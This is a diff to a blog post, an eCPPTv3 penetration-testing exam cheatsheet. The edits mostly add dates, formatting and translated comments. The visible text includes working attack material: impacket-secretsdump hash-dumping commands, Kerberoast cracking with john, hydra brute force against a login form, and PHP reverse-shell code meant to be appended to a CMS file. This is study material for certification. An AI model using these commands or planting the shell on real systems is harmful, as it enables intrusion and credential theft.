@@ -2,10 +2,10 @@
 id: "ine-ecpptv3-cheatsheet"
 title: "eCPPTv3 Cheatsheet"
 author: "mario-ramos-salson"
-publishedDate: YYYY-MM-DD
-updatedDate: YYYY-MM-DD
+publishedDate: 2026-03-24
+updatedDate: 2026-03-24
 image: ""
-description: "eLearnSecurity eCPPTv3 cheatsheet"
+description: "A focused eCPPTv3 cheatsheet covering port enumeration, Active Directory attacks, hash dumping, and brute force techniques"
 categories:
   - "certifications"
 draft: false
@@ -25,6 +25,7 @@ The structure of this cheatsheet is as follows:
 - [Kerberoasting Attack](#kerberoasting-attack)
 - [Hash Dump](#hash-dump)
 - [Content Management Systems](#content-management-systems)
+- [Brute Force](#brute-force)
 
 As you can see, this is not a generic cheatsheet, but one that is focused on this specific exam.
 
@@ -103,17 +104,17 @@ enum4linux -U -M -S -P -G 10.10.10.10
 ```
 
 Flags:
-- -o: gets remote OS information.
-- -U: enumerates users.
-- -S: enumerates shares.
-- -G: enumerates groups.
-- -i: enumerates printers.
-- -r: gets information via RID cycling enumeration.
-- -u: user for authentication.
-- -p: password for authentication.
-- -a: runs a wide enumeration (equivalent to "all").
-- -M: enumerates machine information in the domain/workgroup.
-- -P: gets password policy information.
+- `-o`: gets remote OS information.
+- `-U`: enumerates users.
+- `-S`: enumerates shares.
+- `-G`: enumerates groups.
+- `-i`: enumerates printers.
+- `-r`: gets information via RID cycling enumeration.
+- `-u`: user for authentication.
+- `-p`: password for authentication.
+- `-a`: runs a wide enumeration (equivalent to "all").
+- `-M`: enumerates machine information in the domain/workgroup.
+- `-P`: gets password policy information.
 
 ### WinRM - PORT 5985/5986
 
@@ -486,8 +487,7 @@ john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt kerberoast_has
 ```bash
 impacket-secretsdump 'domain.local/USER:PASSWORD'@10.10.10.10
 
-With NTLM hash
-
+# With NTLM hash
 impacket-secretsdump 'domain.local/USER'@10.10.10.10 -hashes :NTHASH
 
 # With Kerberos ticket
@@ -544,8 +544,8 @@ Once you are in that file, go all the way to the end and add the following block
 ```php
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '127.0.0.1';   // CAMBIAR
-$port = 4444;        // CAMBIAR
+$ip = '127.0.0.1';   // CHANGE
+$port = 4444;        // CHANGE
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
@@ -759,4 +759,4 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.10 https-post-form "
 - `-t N`: number of parallel tasks/threads (default: 16).
 - `-V` or `-vV`: verbose mode to see each attempt.
 - `-f`: stop when a valid credential is found.
-- `-s PORT`: specify a custom port if it is not the default
+- `-s PORT`: specify a custom port if it is not the default.
